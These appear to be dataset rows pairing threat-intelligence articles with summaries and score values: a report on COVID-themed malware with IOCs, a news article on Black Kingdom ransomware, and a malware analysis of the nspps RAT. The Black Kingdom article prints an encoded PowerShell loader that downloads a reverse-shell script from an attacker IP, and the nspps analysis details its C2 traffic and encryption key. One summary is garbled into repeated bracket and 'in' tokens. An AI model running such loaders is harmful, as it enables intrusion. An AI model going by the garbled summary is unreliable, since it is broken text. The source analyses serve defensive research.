coronaviruscovid-19-information[.]com and covid19-info[.]online (among others) to trick users into downloading the Cerberus trojan. Navigating to one of these websites prompts the visitor to download Cerberus that masquerades as an Adobe Flash Player update. Once installed, Cerberus' primary objective is to steal financial information, however, the trojan can be manipulated depending on the actor's objective.Figure 13 - Coronavirus-related URL Prompting for Adobe Flash Player Update (Cerberus)IOCsDomains / IPs/ URLs104.160.44[.]85123.51.185[.]7569.172.75[.]223vietnam[.]zing[.]photosmotivation[.]neighboring[.]sitehttp://vietnam.zing.photos:443/update?wd=df07d8bamotivation[.]neighboring[.]site/01/index.phpHashesFile Name MD5 Hash Http_dll.dat 0DE06292C0010A4E8F453806373E68D4 http_dll.dll 415591D11CF6AEB940AC92C904A1F26A 02-21-1.rar A0D41E87BF259CE882C4977D79FA806A 03-01-1.rar 24AF885E38D7CA7912824F2470E5E6BE Chi Thi cua thu tuong nguyen xuan phuc.rar 60C89B54029442C5E131F01FF08F84C9 02-21-1.lnk FC00964131A8C9407BA77484E724FC9D 03-01-1.lnk 0F794D6C6646A260558E9D638AE060C9 Chi Thi cua thu tuong nguyen xuan phuc.lnk A4B7FE08900074B6A103D2CF36730421 3UDBUTNY7YstRc.tmp 83D04F21515C7E6316F9CD0BB393A118 486AULMsOPmf6W.tmp 371E896D818784934BD1456296B99CBE 9sOXN6Ltf0afe7.js 4F8FF5E70647DBC5D91326346C393729 cSi1r0uywDNvDu.tmp EEFEB76D26338E09958AAE5D81479178 MiZl5xsDRylf0W.tmp C1D8966FA1BD7AEE41B2C4AD731407D3 oGhPGUDC03tURV.tmp 37f78b1ad43959a788162f560bdc9c79 Covid.pdf.lnk 21a51a834372ab11fba72fb865d6830e Covid.zip a89607c9515caeb1d784439a1ee1f208 Wordcnvpxy.exe fd648c3b7495abbe86b850587e2e5431 20200308-sitrep-48-covid-19.pdf FAF5EF01F4A9BF2ABA7EDE67DCC5A2D4 covid-19.jar 13c26ea1dc3a2fee403a7913f6f66c03 covid-precautions .exe 45a0797b74db206615e92050ecf7b31e Basic_protection.pdf c9184430cfd1e72ff9213e67f73b06c2 file2.exe ec517204fbcf7a980d137b116afa946d CoronaVirus_Video-11032020BRTORS2VYLLOC8NTR7DA79YIM6.vbs 0a648ccc4c7ce4f4315adc22878c49c2 Official communication by Ferribiella Italy-CORONAVIRUS 11.03.2020_EN.exe 405f2f6fa2077552fa848bb740bd5ffd CORONA TREATMENT.doc 4efc395c3cd44646e2bfb9680932b811 logday.dll 4efc395c3cd44646e2bfb9680932b811 Coronavirus_disease_COVID-19__773315073441331.doc 8ff6621ecf76a5632dc7ca459f3e5a89 ?????.docx 3519b57181da2548b566d3c49f2bae18 ???????????.xlsm b08dc707dcbc1604cfd73b97dc91a44c POEA HEALTH ADVISORY re-2020 Novel Corona Virus.pdf.exe f59c558d9b33a25ac8b32f495f6fd035 COVID-19_Tracker.exe 595149b8dcab35fde269a86d0bd74756 Avist.apk 660159f431b5f8ec8c4fed0298168d1a https://covid19-info[.]online/UpdateFlashPlayer_11_5_1.apk 3382348f9618058dde3aacffcb34982e Corona Virus Advice For Publicpdf.exe 8a228725fe66ab52a62eb44687ad0680 St John of God Health Care (COVID-19) Notice.pdf 19fda4048f29fbf6e0c9e0a4b8bd0946 Download PDF File - Coronavirus Disease 2019 Controls scr e7fab8e420dd74157bc4dcc5ab396dc8Other Coronavirus-themed Hashesa70a55e62c963d58817e5087fe9fe7e33a2438dd2c13c48ce7867a9ebefc9e5a9ca4f31fb9707adc43d9b7e630b2cf26fb525e13cb82ea91b9d7576e3078674cdc0d41af833054bc8fd6fa3894fed188a61ab959038859f3a185ab688271894ce53ce7efb47a1ea67fa8df6621f2294b98051bcea1ec152a80c6acaa4e46a069f908dc8852f659dd43a8dc25f3d74c2e62a5677e30343bc14078b97148d6703671b3db4cf0a03c8650c140e023a06793bb512de5decd3a2428407660ff57678c2e1ea39e25dde32a9a36078ac59db8141e85dd017cd9f9d856e5943e8824009e3bc7a303e48a39b0582cb6aa888b6f49e5ce3207e8e7019bd0f0963956267128af5ce343c7e4c64319c658c87b85f9a6002e017b97eda9eaae523a0a9a518d8426b95d45df0744d11cf1d91f5629ba872d79034d853b32423b1e06c3f27bfc610fb5cc4ac25234239d291e40b47c98d3fc20439e60e168f7bc5b1afd0a31e015b0ef3735aaf9ea9de69848d7131c6942a0045f26111de6b079dc0bffd5aef4e64b30f50d1a8f8c12bca8fd436c1469fdb3f496ce13ff6fed1048399e1fc894037b4a3d320a888059a6328a61f21d90958bd336d4dcdc4f45a9a5c72d5791f6a855879cddb0e18c34aaa992d24690e0e7320cde0e1b34e03f0ea393a0483b6798ConclusionThreat actors are opportunistic and will continuously update themes of their malicious campaigns in whichever way they believe will increase the chances of completing an objective. Commodity malware will change to whatever themes are relevant to the current period in time. As discussed in this report, threat actors are still utilizing TTPs known about and discussed in the security community, it is only the content of social engineering documents that has changed.The Coronavirus effect is world-wide and increasingly affecting individuals in real life and online. We hope everyone is doing their best to stay safe during these times. Additional information on the Coronavirus can be found on the following websites:Endnotes[1] CISA, ""Defending Against COVID-19 Cyber Scams,"" US-CERT, accessed March 17, 2020, published March 6, 2020, https://www.us-cert.gov/ncas/current-activity/2020/03/06/defending-against-covid-19-cyber-scams, Insikt Group, ""Capitalizing on Coronavirus Panic, Threat Actors Target Victims Worldwide,"" Recorded Future, accessed March 17, 2020, published March 12, 2020, https://go.recordedfuture.com/hubfs/reports/cta-2020-0312-2.pdf.[2] ""Rolling updates on Coronavirus disease (COVID-19),"" World Health Organization, accessed March 17, 2020, published March 18, 2020, https://www.who.int/emergencies/diseases/novel-coronavirus-2019/events-as-they-happen.[3] Nick Biasini and Edmund Brumghin, ""Threat actors attempt to capitalize on coronavirus outbreak,"" Cisco Talos Blog, accessed March 17, 2020, published February 13, 2020, https://blog.talosintelligence.com/2020/02/coronavirus-themed-malware.html, ""January 2020's Most Wanted Malware: Coronavirus-themed spam spread malicious Emotet malware,"" Check Point Blog, accessed March 17, 2020, published February 13, 2020, https://blog.checkpoint.com/2020/02/13/january-2020s-most-wanted-malware-coronavirus-themed-spam-spreads-malicious-emotet-malware/.[4] ""January 2020's Most Wanted Malware: Coronavirus-themed spam spread malicious Emotet malware,"" Check Point Blog.[5] Anomali Threat Research Team, ""Multiple Chinese Threat Groups Exploiting CVE-2018-0798 Equation Editor Vulnerability Since Late 2018,"" Anomali Blog, accessed March 17, 2020, published July 3, 2019, https://www.anomali.com/blog/multiple-chinese-threat-groups-exploiting-cve-2018-0798-equation-editor-vulnerability-since-late-2018.[6] Anomali Threat Research Team, ""China-Based APT Mustang Panda Targets Minority Groups, Public and Private Sector Organizations,"" Anomali Blog, accessed March 17, 2020, published October 7, 2019, https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations.[7] Anomali Threat Research Team, ""China-Based APT Mustang Panda Targets Minority Groups, Public and Private Sector Organizations,"" Anomali Blog.[8] ""/ winrm.vbs,"" Living Off The Land Binaries and Scripts (and also Libraries), accessed March 20, 2020, https://lolbas-project.github.io/lolbas/Scripts/Winrm/.[9] ""Higaisa"" Recent Attack Activity Report,"" Tencent Security Threat Intelligence Center, accessed March 18, 2020, published February 27, 2020, https://s.tencent.com/research/report/895.html.";"Coronavirusthemed malware campaigns have been observed by Anomali Threat Research (ATR) and Check Point Research. ATR observed a campaign beginning in late February through midMarch 2020, that we believe is being conducted by the Chinabased APT group, Mustang Panda. The group is utilizing decoy documents related to COVID19 to target Taiwan and Vietnam. Mustang Panda is continuing to use Cobalt Strike and PlugX RAT as their final payloads. This activity aligns with Mustang Panda TTPs previously identified by ATR. Mustang Panda has used the well known adversary emulation tool called Cobalt Strike as the final payload for the following samples 02211.lnk and 03011.lnk. The group has utilized the malleable Command and Control (C2) feature in Cobalt Strike tool to mask the malicious traffic behind a legitimate DNS request to code.jquery.com. The samples mentioned above use 123.51.185[. ]75 as their final C2.Two notable changes from Mustang Panda previous campaigns identified by ATR are:Change in directory C:UsersPublicMusic where the payload is droppedwhere the payload is dropped Usage of the legitimate executable tencentsoso.exe that is used for DLL side loadingThe sample Chi Thi cua thu tuong nguyen xuan phuc.lnk uses PlugX as its final payload. Once executed it drops three files in the directory C:ProgramDataMicrosoft Malware Protectionydy. The unescapp.exe is a legitimate executable that is signed by ""ESET, spol. The malware reaches out to the C2 URL motivation[.]neighboring[.]site and it resolves to 69.172.75[.]223. PlugX is a Remote Access Trojan (RAT) that is commonly used by Chinabased threat actors. . [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [. [. [. [. [. [. [ in [ in in in in in in in in [ to inhe ITSecurity report provides an overview of the current cybersecurity landscape. It discusses the use of commodity malware by threat actors, the Coronavirus effect on cybersecurity, and the use of TTPs by threat actors. Additionally, the report discusses the exploitation of CVE20180798 by Chinabased APT Mustang Panda, as well as recent attack activity by Higaisa.";en;{'r': 0.16163583252190847, 'p': 0.8645833333333334, 'f': 0.272354386189355};{'r': 0.12371134020618557, 'p': 0.75, 'f': 0.21238937810008618};{'r': 0.16163583252190847, 'p': 0.8645833333333334, 'f': 0.272354386189355}
https://www.bleepingcomputer.com/news/security/black-kingdom-ransomware-hacks-networks-with-pulse-vpn-flaws/;Black Kingdom ransomware hacks networks with Pulse VPN flaws;"Operators of Black Kingdom ransomware are targeting enterprises with unpatched Pulse Secure VPN software or initial access on the network, security researchers have found.The malware got caught in a honeypot, allowing researchers to analyze and document the tactics used by the threat actors.Modus operandiThey're exploiting CVE-2019-11510, a critical vulnerability affecting earlier versions of Pulse Secure VPN that was patched in April 2019. Companies delayed updating their software even after exploits became public, prompting multiple alerts from the U.S. government and threat actors started leveraging it, some organizations continue to run a vulnerable version of the product.REDTEAM.PL, a company offering cybersecurity services based in Poland, observed that Black Kingdom operators used the same doorway provided by Pulse Secure VPN to breach what they believed was a target.From the researchers' observations, the ransomware established persistence by impersonating a legitimate scheduled task for Google Chrome, with a single letter making the difference:GoogleUpdateTaskMachineUSA - Black Kingdom task GoogleUpdateTaskMachineUA - legitimate Google Chrome taskAccording to REDTEAM.PL's analysis, the scheduled task runs a Base64-encoded string code in a hidden PowerShell window to fetch a script named ""reverse.ps1"" that is likely used to open a reverse shell on the compromised host.cversions_cache.ps1 script: $update = ""SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4AMQAzAC4ANAA5AC4AMQA3ADkALwByAGUAdgBlAHIAcwBlAC4AcABzADEAJwApAA=="" powershell.exe -exec bypass -nologo -Enc $updateAdam Ziaja of REDTEAM.PL told BleepingComputer that the script could not be retrieved from the remote server controlled by the attacker, probably because the server hosting it was blocked before the payload could be delivered.The IP address where ""reverse.ps1"" resided is 198.13.49.179, which is managed by Choopa, a child company of Vultr, well known for the cheap virtual private servers (VPS) it provides and for being used by cybercriminals to host their malicious tools.It resolves to three domains, the third one being connected to other servers in the U.S. and Italy hosting Android and cryptocurrency mining malware.host.cutestboty.comkeepass.cutestboty.comanno1119.comRecent appearanceBlack Kingdom ransomware was first spotted in late February by security researcher GrujaRS, who found that it appended the .DEMON extension to encrypted files.The sample analyzed (1, 2) contacted the same IP address found in REDTEAM.PL's report. It dropped the following ransom note asking for $10,000 to be deposited to a bitcoin wallet and threatening that failing to do so would lead to the data to be destroyed or sold.Checking the bitcoin address provided by the attacker shows an empty balance and two incoming transactions totaling 0.55BTC, converted to $5,200 at the moment of writing.";Black Kingdom ransomware was first spotted in late February by security researcher GrujaRS, who found that it appended the .DEMON extension to encrypted files. The sample analyzed (1, 2) contacted the same IP address found in REDTEAM.PL's report. It dropped the following ransom note asking for $10,000 to be deposited to a bitcoin wallet and threatening that failing to do so would lead to the data to be destroyed or sold. Checking the bitcoin address provided by the attacker shows an empty balance and two incoming transactions totaling 0.55BTC, converted to $5,200 at the moment of writing.;en;{'r': 0.2947761194029851, 'p': 1.0, 'f': 0.45533140858706583};{'r': 0.2425, 'p': 1.0, 'f': 0.3903420491722974};{'r': 0.2947761194029851, 'p': 1.0, 'f': 0.45533140858706583}
https://www.ironnet.com/blog/malware-analysis-nspps-a-go-rat-backdoor;Malware analysis: nspps, a Go RAT/Backdoor;"At IronNet Threat Research, we're always looking for novel or ""interesting"" malware, to inform analysis that enhances our products' detection capabilities.Recent compromises of specific Citrix products via the CVE-2019-197811234 vulnerability have been brought to light recently by the public exposure of several of the associated malicious software components involved in those events.A trusted partner provided IronNet Threat Research with a copy of one of those components in isolation, a binary that appears to be a userspace remote access tool (RAT) or backdoor written in Go (a.k.a. ""golang""), and built for use upon FreeBSD targets. It is a fully featured utility, and would be a suitable first stage for deployment via the exploitation scenario, though we weren't afforded endpoint details from the intrusion that might confirm that.Brief, publicly available overview information on the RAT's functionality and related IOCs has been published, including summary notes from TrustedSec5 and X-Force IRIS6. TrustedSec's post associates ""nspps"" with coinminer activity based on ""XMRig 5.5.0"", and similar activity was also noted in the intrusion from which our sample was derived. The MD5 of the coinminer binary sample, 08f76eb3d62d53bff131d2cb0af2773d, is detected by several prominent AV engines and won't be covered here.The ""nspps"" binary, however, was detected only by 1 out of 59 AV engines in VirusTotal7 as of April 17, 2020. That's interesting, so let's look a little further into what it actually is and does, to expand on some of the previously published information.SampleFilename nspps Other Names Seen klli Bytes 5903136 MD5 568f7b1d6c2239e208ba97886acc0b1e SHA1 3bbb58a2803c27bb5de47ac33c6f13a9b8a5fd79 SHA256 5059d67cd24eb4b0b4a174a072ceac6a47e14c3302da2c6581f81c39d8a076c6 SSDEEP 49152:UlXI4CgZBnDLT2zsFHvPguFZo9Tm4YPlQbgEINZkZg72c5RhiU0ThKtLoLrnqWQ:uBDTvboVm4Y7NZk2idwczQ File ""Magic"" ELF 64-bit LSB executable, x86-64, version 1 (FreeBSD), statically linked, stripped Likely Compiler Version Go 1.9.7The file was provided to us from an incident response (IR) related to one of the noted intrusions. The filename ""nspps"" was observed, which is likely a hide-in-plain-sight attempt at blending into a process list alongside NetScaler appliance processes named ""nsppe"", which would be the name for legitimate instances of the NetScaler Packet Processing Engine process.A VirusTotal lookup using one of the file's hashes shows that this same binary has also been seen using the file/process name ""klli"".https://support.citrix.com/article/CTX267027, ""CVE-2019-19781 - Vulnerability in Citrix Application Delivery Controller, Citrix Gateway, and Citrix SD-WAN WANOP appliance"", Citrix Support Knowledge Center, Modified January 24, 2020. https://www.citrix.com/blogs/2020/01/24/citrix-releases-final-fixes-for-cve-2019-19781/, ""Citrix releases final fixes for CVE-2019-19781"", Fermin J. Serna, CISO, Citrix, January 24, 2020. https://www.us-cert.gov/ncas/alerts/aa20-031a, ""Alert (AA20-031A): Detecting Citrix CVE-2019-19781"", U.S.Cybersecurity and Infrastructure Security Agency (CISA), Last Revised February 18, 2020. https://www.cyber.gc.ca/en/alerts/detecting-compromises-relating-citrix-cve-2019-19781-0, ""Alert: Detecting Compromises relating to Citrix CVE-2019-19781 (AL20-005)"", Canadian Centre for Cyber Security, February 4, 2020. https://www.trustedsec.com/blog/netscaler-honeypot/, ""NETSCALER HONEYPOT"", Tyler Hudak, TrustedSec, January 13, 2020. https://exchange.xforce.ibmcloud.com/malware-analysis/guid:af7bb9f9798776e2cd98c70d9f63aab1, ""X-Force IRIS Malware Analysis Report: nspps Analysis Report"", IBM X-Force Incident Response and Intelligence Services (IRIS), Last updated January 29, 2020. https://www.virustotal.com/gui/file/5059d67cd24eb4b0b4a174a072ceac6a47e14c3302da2c6581f81c39d8a076c6/detection, Virus Total Search for SHA256: 5059d67cd24eb4b0b4a174a072ceac6a47e14c3302da2c6581f81c39d8a076c6, last performed April 17, 2020.Network informationCommand and Control (C2) Server Addresses DNS Resolution (as of March 17, 2020) hxxp://188[.]120[.]254[.]224 kindora85[.]fvds[.]ru hxxp://46[.]229[.]215[.]164 vds-cg30906[.]timeweb[.]ru hxxp://62[.]113[.]112[.]127 host-62-113-112-127[.]hosted-by-vdsina[.]ruAdditionally, ""nspps"" stands up a SOCKS5 server ""listen"" on IP 0.0.0.0 (i.e. INADDR_ANY, to match on all of the target's available network interfaces), using a random TCP port number generated between the values 30000 and 32000 (inclusive), as well as 8-byte randomly generated ""user"" and 8-byte randomly generated ""pass"" values, for use in authentication to the SOCKS5 server. Upon startup, those values are delivered back to the connected C2 server.Our SOCKS5 Server ""random"" TCP Port (possibly constant per ""nspps"" binary) 31458The values used to build the strings for both ""user"" and ""pass"" are ASCII characters, generated from the range ""[A-Za-z]"".During multiple runs, on 2 different FreeBSD platforms (8.4 and 12.1), ""nspps"" produced the same ""random"" values for the SOCKS5 TCP port number, ""user"" and ""pass"" values.""nspps"" uses functions in Go's ""math/rand"" package for pseudo-random number generation (PRNG), whose documentation mentions ""Random numbers are generated by a Source. Top-level functions, such as Float64 and Int, use a default shared Source that produces a d eterministic sequence of values each time a program is run. Use the Seed function to initialize the default Source if different behavior is required for each run .""8These SOCKS5 ""random"" values are generated in the ""main.main"" function during ""nspps"" startup, using ""main"" package functions that wrap calls to ""math/rand"" Go functions...the ""user"" and ""pass"" values are both produced by a call to ""main.RandStringRunes"", which in turn invokes ""math/rand.Intn"", which is documented, in part, as ""returns, as an int, a non-negative pseudo-random number in [0,n) from the default Source"" 9the TCP port value is obtained through a call to ""main.randIntRange"", which then also calls ""math/rand.Intn""...as follows...Curiously, the ""Use the Seed function to initialize the default Source if different behavior is required for each run"" part isn't done here until a bit later down in the code (specifically at offset 0x6EC552, ""call math_rand_Seed"")...https://golang.org/pkg/math/rand/, ""Go Package rand"". https://golang.org/pkg/math/rand/Intn, ""Go Package rand, func Intn""....so it appears that the ""user"", ""pass"" and TCP port ""random"" values returned from the unseeded Go PRNG may be constant for every instance of this ""nspps"" binary that's deployed.Encryption InformationData payloads, with the exception of log messages, exchanged between the ""nspps"" client and its C2 server(s) are marshalled and obfuscated before sending by...Marshalling into JSON via the encoding/json.Marshall function, thenfunction, then ENcrypting with RC4 via the Go function crypto/RC4.Cipher_XORKeyStream...and deobfuscated and unmarshalled on the receiving side by...DEcrypting with RC4 via the Go function crypto/RC4.Cipher_XORKeyStream, thenUNmarshalling from JSON via the encoding/json.Unmarshall functionLog messages, which should be ASCII text sequences, are shipped from ""nspps"" to its C2 server(s) without JSON marshalling, using only the RC4 encryption via crypto/RC4.Cipher_XORKeyStream.The RC4 key used for encryption of the data payloads is the following, fixed 12-byte sequence, hardcoded within ""nspps""...RC4 Encryption Key Hexadecimal: [ 0x37 0x36 0x34 0x31 0x35 0x33 0x34 0x34 0x36 0x62 0x36 0x31 ] (Rendered as ASCII, the key would appear as the 12 characters ""764153446b61"")Endpoint InformationAdvisory Lock File Employed ""/var/run/linux.lock"" or ""/tmp/linux.lock"" Writeable Directory, "".netscalerd"" ""/var/tmp/.netscalerd"" or ""/tmp/.netscalerd"" Likely Implant ID File, ""uuid"" ""/var/tmp/.netscalerd/uuid"" or ""/tmp/.netscalerd/uuid"" Downloaded Files with Randomized Filenames Filenames used to stage downloaded content from C2 server(s) are generated using random alphabetic bytes chosen from the range ""[A-Za-z]"". Note that deleted instances of these files may still be recoverable from the filesystem, if their inodes or disk allocation units have not been reused by subsequent filesystem activity. Shell Script to Download Copy of ""Masscan"" Executable Filename ""firewire.sh"", when needed, is extracted by ""nspps"" from within itself, written to its current working directory, made executable, executed, and then removed from disk Binary Copy of ""Masscan"" Executable (if present) Filename ""firewire"", downloaded into the current working directory of ""nspps""Notes:The lock file is used as a single-thread execution assurance device. The file (0-length in our lab testing) is opened and placed under an ""advisory"" lock, via an ""fcntl(fd, F_SETLK, ...)"" system call, by the first ""nspps"" process to gain execution. Any additional ""nspps"" processes (that are not child processes of an initial ""nspps"" process) would receive an EAGAIN (errno:35, ""Resource temporarily unavailable"") error on the syscall, and then immediately exit, accordingly. The filename for the lock file is generated from the format string ""%s.lock"" in the my/bot/single.Single_Filename function, with the argument ""linux"" passed as the referenced string parameter. ""linux"" is hardcoded in the ""nspps"" binary despite it being compiled for FreeBSD, which, along with some other Linux specificity in the ""firewire.sh"" script, possibly suggest that the same set of Go source code might be used to generate both Linux and BSD editions, without employing platform-specific conditional compilation directives.The ""writable directory"" is generated by manufacture of both potential pathnames, and the first one deemed to have been successful is used (""/var/tmp/.netscalerd"" will be the first checked). Both directories appear to be left in place, even though only one of the two will be used. Additionally, should both directories fail to be generated for some reason, an attempt is made to use the environment variable ""TMPDIR"" (which normally resolves to ""/tmp"" on ""*n[iu]x"" systems) to situate the working directory. The ""writable directory"" does not appear to be used as a current working directory by ""nspps"", as we observed no ""chdir"" system calls or navigation in the actor-specific portions of code or in lab testing, subsequent to manufacture of these directories.The ""uuid"" file is placed within the chosen writable directory. It contains 36 bytes, the ASCII representation of an RFC 4122 compliant Universally Unique Identifier (UUID), generated by the first execution of ""nspps"", using a pseudo-random sequence obtained from the Go crypto/rand.Read function. As we'll see shortly, this UUID value is provided by ""nspps"" in corresponding HTTP headers, when communicating with its C2 server(s).""firewire""...""nspps"" extracts the following ""firewire.sh"" file from itself starting at file offset 0x3C4D1D for a length of 1400 (0x578) bytes...Filename firewire.sh Bytes 1440 MD5 0f40acb1e71ccdfda9c94a1b91546edf SHA1 253a3900ef4828dc4d74075248f249789d81a6b0 SHA256 bad4bac373134a0457bf04271836c65373486902cfbb7ea756edd0b1fbab8a65 File ""Magic"" ASCII textThe script should run on both Linux and FreeBSD platforms, though it contains a bit of Linux-centric content within.Notes...Lines 9-29: When executed on a Red Hat- or Debian-based Linux platform, the utility pairs ""rpm"" and ""yum"" (Red Hat) or ""dpkg-query"" and ""apt-get"" (Debian) will be used to confirm that the ""libpcap-dev"" package is installed, and try to install if not. No real error handling for the installation commands is done on a platform where they might not exist, so a FreeBSD platform would fall through and continue to process the script, accordingly.The remainder of the script should be more platform agnostic. Lines 31-48 try to find the file ""firewire"" in its current working directory, and verify that it matches the MD5: 45a7ef83238f5244738bb5e7e3dd6299. If either the ""md5sum"" command is not available, or the output of the ""md5sum"" command does not contain the desired MD5, an attempt is made to download a copy of the file ""firewire"" from the Internet address/URL contained in the ""$MASSCAN"" variable (assigned from script input parameter ""$5"" at line 7). This is tried first with ""curl"", and then ""wget"", if ""curl"" was unsuccessful for any reason. Lastly, ""chmod"" is used to make ""firewire"" executable.Finally, ""firewire"" is executed at line 50, using the ""$PORT"", ""$RATE"", ""$INPUT"", and ""$OUTPUT"" variables (all assigned in lines 3-6 from script input parameters ""$1"", ""$2"", ""$3"", and ""$4"", respectively) to form its command line parameters. Note that if the attempt at execution fails, the script assumes that to be due to insufficient privilege level of the current user, and a second execution of ""firewire"" is attempted at line 56 using ""sudo"", which will try to execute the command as the system's superuser, or ""root"".We did not receive a copy of ""firewire"" to examine, but given that...""nspps"" parses and handles a ""masscan"" command sent from its C2 server(s). The handler for that command is the ""main. masscan "" function, that drops the ""firewire.sh"" script to disk and executes it. The MD5 45a7ef83238f5244738bb5e7e3dd6299 mentioned in ""firewire.sh"" is found within VirusTotal10, and the exported symbols listed there are all found within source code for the ""Masscan: Mass IP port scanner"", which professes itself to be ""an Internet-scale port It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second, from a single machine""11, publicly available at hxxps://github[.]com/robertdavidgraham/masscan. The ""firewire"" command-line parameters invoked in ""firewire.sh"" are also found documented as among those in ""masscan""....we believe ""firewire"" == ""Masscan"".It's likely that ""firewire"" is used for any requisite port scanning to be performed within victim network space, and given the ""fire"" in ""firewire"" coupled with the indicated high-performance capability of the scanner, it may also be a vehicle used to conduct denial of service attacks in target space.Initial C2 CalloutsFollowing ""nspps"" startup on a lab FreeBSD 8.4 target, there were three initial connections attempted to its C2 endpoint(s). There appears to be a notion of a ""current C2 server"" within ""nspps"", effectively being the most recent C2 server to which it has successfully connected and exchanged data. At program startup, the ""current C2 server"" is set to the first network address in its list of C2 servers, ""hxxp://188[.]120[.]254[.]224"", and first attempts at connectivity will be initiated using that address.The callouts are Web requests (2 ""GET"" and 1 ""POST""), issued using the external Go package ""github[.]com/go-resty/resty"", an HTTP and REST client library for Go. Each of the callouts has its own periodicity, and via the ""resty"" package has a retry count, retry wait time, max retry wait time, and also implements a ""backoff"" algorithm, according to the package's' ""README.md"" notes.12 The ""main"" package's functions that perform each of these requests implement a default sleep time between retries of the respective request, mentioned in each request's notes, below.The following three C2 callouts were observed from ""nspps"" at startup, within the same second. You'll note repetitive use of some of the following HTTP headers, including system survey information, probably for assuring proper selection of subsequent tasking, targeting and content downloads by the C2 server to match the requesting platform, software, and privilege levels...Arch: amd64Cores: 1Mem: 2031Os: freebsdOsname: freebsdOsversion: 8.4-releaseRoot: true (when the currently executing user is no t ""root"", this value is set to ""false"", possibly signifying the need for C2 upload of a follow-on privilege escalation utility for this type of architecture, before going much further)""root"", this value is set to ""false"", possibly signifying the need for C2 upload of a follow-on privilege escalation utility for this type of architecture, before going much further) Uuid: 8ec35f4d-03dd-4808-7c6e-3f8e6096b326 (probable implant/RAT ID unique value)Version: 28 (hardcoded value: possibly the version of this edition of ""nspps"" RAT)https://www.virustotal.com/gui/file/0ba3530c7bbd551965fde10034b9f92954860059ad669c0fbcd2c13dee8a3780/detection, VirusTotal Lookup for MD5 45a7ef83238f5244738bb5e7e3dd6299, Last verified: March 17, 2020. https://github.com/robertdavidgraham/masscan/blob/master/README.md, ""MASSCAN: Mass IP port scanner"", Robert Graham, April 21, 2019. https://github.com/go-resty/resty/blob/master/README.md, ""Resty: Simple HTTP and REST client library for Go"", February 24, 2020.1. ""nspps"" initiates a C2 server check sequence, by starting the new goroutine ""main.healthChecker"", which calls the ""main.checkHealth"" function to send out a ""GET /h"".GET /h HTTP/1.1\rHost: 188[.]120[.]254[.]224\rUser-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\rArch: amd64\rCores: 1\rMem: 2031\rOs: freebsd\rOsname: freebsd\rOsversion: 8.4-release\rRoot: true\rUuid: 8ec35f4d-03dd-4808-7c6e-3f8e6096b326\rVersion: 28\rAccept-Encoding: gzip\r\rThe C2 server check will attempt to repetitively contact each of its 3 embedded addresses...hxxp://188[.]120[.]254[.]224hxxp://46[.]229[.]215[.]164hxxp://62[.]113[.]112[.]127...in turn, using the first one which successfully responds with a status code 200 (""OK"") as its current C2 server. Between ""health check"" attempts, ""main.healthChecker"" will issue a ""time.Sleep"" call, pausing for 60 seconds before the next connection attempt.""nspps"" sends a ""GET /get"" request to its current C2 server, as a ""task"" fetch, checking to see if there's any queued tasking/processing to be performed on target...GET /get HTTP/1.1\rHost: 188[.]120[.]254[.]224\rUser-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\rArch: amd64\rCores: 1\rMem: 2031\rOs: freebsd\rOsname: freebsd\rOsversion: 8.4-release\rRoot: true\rUuid: 8ec35f4d-03dd-4808-7c6e-3f8e6096b326\rVersion: 28\rAccept-Encoding: gzip\r\rThis request is issued by the ""main.getTask"" function, as part of a task solicitation and handling loop performed within the ""main.main"" function once it has completed initial setup and processing. If the C2 server responds with a status code 404 (i.e. ""Not Found""), there are no tasks waiting to be performed at the present time.Should a non-404 response be received, the returned response data, containing tasks and the parameters for performance of those tasks, is decrypted using our previously noted RC4 key by the ""main.RC4"" function, then unmarshalled via ""encoding/json.Unmarshal"", and returned to ""main.main"".""main.main"" passes the decrypted/unmarshalled tasking data to the ""main.doTask"" function, which contains a large ""if/then/else"" construct to validate the task string, and invokes the corresponding handler routine from within the ""main"" package to implement the desired functionality. Depending on the task, subsequent processing is performed either by direct function call, or via Go's concurrent processing capability, employing channels and multiple goroutines.Each iteration of this ""main.getTask/main.doTask"" solicitation and processing attempt will be coordinated by a ""time.Sleep"" call which pauses for 10 seconds.More detail on the specific tasks/commands supported within ""nspps"" and their functionality is presented in the following section, ""Command and Control (C2) Protocol Summary"".""nspps"" implements a SOCKS5 proxy server on target, by starting a new goroutine at ""main.startSocks"", which calls ""github[.]com/armon/go-socks5.Server_ListenAndServe"" on IP 0.0.0.0 (i.e. INADDR_ANY) and the randomly generated TCP port. The ""main.sendSocks"" function is called to send the ""POST /s"" request including a JSON marshalled, RC4 encrypted data payload, to inform the C2 server as to the randomly generated ""user"", ""pass"" and TCP port values that are to be used for subsequent connections to the SOCKS5 server now running in victim space...POST /s HTTP/1.1\rHost: 188[.]120[.]254[.]224\rUser-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\rContent-Length: 50\rArch: amd64\rContent-Type: application/octet-stream\rCores: 1\rMem: 2031\rOs: freebsd\rOsname: freebsd\rOsversion: 8.4-release\rRoot: true\rUuid: 8ec35f4d-03dd-4808-7c6e-3f8e6096b326\rVersion: 28\rAccept-Encoding: gzip\r\r<...followed by the next 50 bytes of that ""application/octet-stream"" data...>HH HH HH HH HH HH HH HH HH HH HH HH HH HH HH HHHH HH HH HH HH HH HH HH HH HH HH HH HH HH HH HHHH HH HH HH HH HH HH HH HH HH HH HH HH HH HH HHHH HH...where ""HH"" represents the actual byte values transmitted.This request is a bit more interesting than the first two, because it also appends a 50-byte data payload, which can be decrypted and unmarshalled to obtain the target's SOCKS5 proxy information. After decryption with the previously noted RC4 key, the JSON-marshalled plaintext should appear as...{""User"":""UUUUUUUU"",""Pass"":""PPPPPPPP"",""Port"":NNNNN}...where...UUUUUUUU would be the random SOCKS5 server user authentication valuePPPPPPPP 